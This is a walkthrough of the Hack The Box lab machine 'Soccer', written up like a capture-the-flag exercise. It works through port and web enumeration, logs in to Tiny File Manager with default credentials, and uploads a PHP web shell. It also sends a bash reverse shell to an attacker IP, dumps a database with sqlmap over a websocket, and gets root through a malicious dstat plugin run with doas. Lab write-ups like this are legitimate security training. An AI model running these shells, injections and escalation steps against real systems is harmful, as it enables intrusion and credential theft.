OS: Linux
Tags: Tiny File Manager, File Upload, SQL Injection, doas, dstat

nmap scan to see open ports
`sudo nmap $IP -p- -vv -n -Pn -T4`
```
PORT     STATE SERVICE        REASON
22/tcp   open  ssh            syn-ack ttl 63
80/tcp   open  http           syn-ack ttl 63
9091/tcp open  xmltec-xmlmail syn-ack ttl 63
```
nmap service and version scan 
`nmap 10.10.11.194 -p22,80,9091 -vv -n -Pn -sC -sV`
```
22/tcp   open  ssh             syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=
|   256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=
|   256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/
80/tcp   open  http            syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://soccer.htb/
9091/tcp open  xmltec-xmlmail? syn-ack ttl 63
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 139
|     Date: Thu, 26 Jun 2025 06:15:07 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot GET /</pre>
|     </body>
|     </html>
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Content-Security-Policy: default-src 'none'
|     X-Content-Type-Options: nosniff
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 143
|     Date: Thu, 26 Jun 2025 06:15:07 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error</title>
|     </head>
|     <body>
|     <pre>Cannot OPTIONS /</pre>
|     </body>
|_    </html>
```

add ip address into /etc/hosts
```
ip.address soccer.htb
```

### Web Enumeration
VHost Fuzzing
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://soccer.htb/ -H 'Host: FUZZ.soccer.htb'
```
no result, no vhost

Sub-domain Fuzzing
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.soccer.htb/
```
none found

Directory Fuzzing
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://soccer.htb/FUZZ/
```
found tiny

Enumerate tiny
```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://soccer.htb/tiny/FUZZ
```
found uploads (currently forbidden)

Go to `http://soccer.htb/tiny/`
## Login
Search up tiny file manager online, get the github link https://github.com/prasathmani/tinyfilemanager

found default credentials: 
![](../Assets/Screenshot%202025-06-26%20at%203.07.50%20PM.png)
user/12345 works

We get a place to upload files
![](../Assets/Screenshot%202025-06-26%20at%203.08.57%20PM.png)

in tiny/inyfilemanager.php we see
```
$auth_users = array(
    'admin' => '$2y$10$/K.hjNr84lLNDt8fTXjoI.DBp6PpeyoJ.mGwrrLuCZfAwfSAGqhOW', //admin@123
    'user' => '$2y$10$Fg6Dz8oH9fPoZ2jJan5tZuv6Z4Kp7avtQ9bDfrdRntXtPeiMAZyGO' //12345
);
```
lets try to login using admin and admin@123
now we have more privileges like uploading files
![](../Assets/Screenshot%202025-06-26%20at%203.14.23%20PM.png)

we know that its a php website so we can try to upload a php shell 
```
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```
then upload the shell.php onto the tiny
but we get this error:
![](../Assets/Screenshot%202025-06-26%20at%203.16.48%20PM.png)

lets try to upload it in /tiny/uploads instead
![](../Assets/Screenshot%202025-06-26%20at%203.17.36%20PM.png)
it works
![](../Assets/Screenshot%202025-06-26%20at%203.17.54%20PM.png)
and then we can access it through
```
http://soccer.htb/tiny/uploads/shell.php?cmd=ls
```
this should show shell.php because that is the only file in the current path

we managed to enumerate and found the flag in /home/player/user.txt
```
http://soccer.htb/tiny/uploads/shell.php?cmd=cat%20../../../../../home/player/user.txt
```
but we can't cat it like this

lets try to reverse shell this
```
curl http://soccer.htb/tiny/uploads/shell.php -d 'cmd=bash -c "bash -i >%26 /dev/tcp/10.10.14.26/4444 0>%261"'
```

get fully interactive TTY
```
/bin/sh -i
```

so when i cat user.txt, it says

```
cat: user.txt: Permission denied
```

## Become player
check what other websites are running
check /etc/nginx/sites-enabled -> we know its nginx based on the nmap scan on top
there is two files
```
default
soc-player.htb
```
soccer.htb is the default file 

catting the soc-player.htb file we get
```
$ cat soc-player.htb
server {
        listen 80;
        listen [::]:80;

        server_name soc-player.soccer.htb;

        root /root/app/views;

        location / {
                proxy_pass http://localhost:3000;
                proxy_http_version 1.1;
                proxy_set_header Upgrade $http_upgrade;
                proxy_set_header Connection 'upgrade';
                proxy_set_header Host $host;
                proxy_cache_bypass $http_upgrade;
        }

}
```
can add that into /etc/hosts

and then nagivate to soc-player.soccer.htb
![](../Assets/Screenshot%202025-06-26%20at%203.54.38%20PM.png)
there is a signup and login page

in the signup page: try to create a user
![](../Assets/Screenshot%202025-06-26%20at%203.55.29%20PM.png)
And then login with our new account, we get into a page with something that queries for the ticket:
![](../Assets/Screenshot%202025-06-26%20at%203.56.14%20PM.png)
get the request through burp we get: 
```
GET / HTTP/1.1
Host: soc-player.soccer.htb:9091
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Sec-WebSocket-Version: 13
Origin: http://soc-player.soccer.htb
Sec-WebSocket-Key: pMcZOvxy6CwkEKS6nIxDpg==
Connection: keep-alive, Upgrade
Cookie: connect.sid=s%3AfCChkAO01LUkWXs8dDb9-qfoXxkuPTdG.bpQ9142RHf8OETGLUZjOklW%2BLbJQMTmuWTfsOEoL5Wg
Pragma: no-cache
Cache-Control: no-cache
Upgrade: websocket
```
so port 9091 might be a websocket because its saying sec-websocket-version and sec-websocket-key

we can inspect the websocket requests and responses in firefox dev tools, network tab
![](../Assets/Screenshot%202025-06-26%20at%204.12.54%20PM.png)
but it just sends id=1234

We can check whether its vulnerable to SQL Injection or not
![](../Assets/Screenshot%202025-06-26%20at%204.16.54%20PM.png)
so it says 1234 exists even though just now it says it doesn't exist 

so its definitely vulnerable to sql injection
we can try a union injection

1. find out how many columns the ticket thing is: 
![](../Assets/Screenshot%202025-06-26%20at%204.22.55%20PM.png)
so we know its 3 columns

we can run that on sqlmap now
```
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --union-cols=3
```
it works:
![](../Assets/Screenshot%202025-06-26%20at%204.28.47%20PM.png)
now we can try to get more information about the database
```
sqlmap -u 'ws://soc-player.soccer.htb:9091' --data '{"id": "1234"}' --dbms mysql --batch --level 5 --risk 3 --union-cols=3 --dump --is-dba
```
we get that the user is player@localhost but it doesn't have dba rights

we managed to get the password of player
![](../Assets/Screenshot%202025-06-26%20at%204.30.56%20PM.png)

try this password in ssh
![](../Assets/Screenshot%202025-06-26%20at%204.31.47%20PM.png)
we managed to get in

then we can cat the user.txt flag

### Privilege Escalation
get linpeas.sh 
```
wget https://github.com/peass-ng/PEASS-ng/releases/download/20250601-88c7a0f6/linpeas.sh
```

set up a python http server on our attack host
```
python3 -m http.server
```

get the linpeas.sh from soccer machine
```
wget http://10.10.14.26:8000/linpeas.sh
```

execute linpeas.sh after giving it permisison to execute

![](../Assets/Screenshot%202025-06-26%20at%204.57.26%20PM.png)
we find that we can run doas and dstat

what is doas? doas is like sudo. 
![](../Assets/Screenshot%202025-06-26%20at%205.07.27%20PM.png)
GTFO bins explains how to use dstat to open a shell
![](../Assets/Screenshot%202025-06-26%20at%205.06.39%20PM.png)

so we can do this but we can't save it in the players home directory
![](../Assets/Screenshot%202025-06-26%20at%205.16.39%20PM.png)
we can't save it in /root/.dstat either because we have no permission. /usr/share/dstat is not writtable by us either.
![](../Assets/Screenshot%202025-06-26%20at%205.17.39%20PM.png)
we can write it in /usr/local/share/dstat 
![](../Assets/Screenshot%202025-06-26%20at%205.18.13%20PM.png)

```
echo 'import os; os.execv("/bin/sh", ["sh"])' > /usr/local/share/dstat/dstat_xxx.py
doas /usr/bin/dstat --xxx
```

now we are root
![](../Assets/Screenshot%202025-06-26%20at%205.13.34%20PM.png)

we can cat the flag in /root

yay we have pwned the machine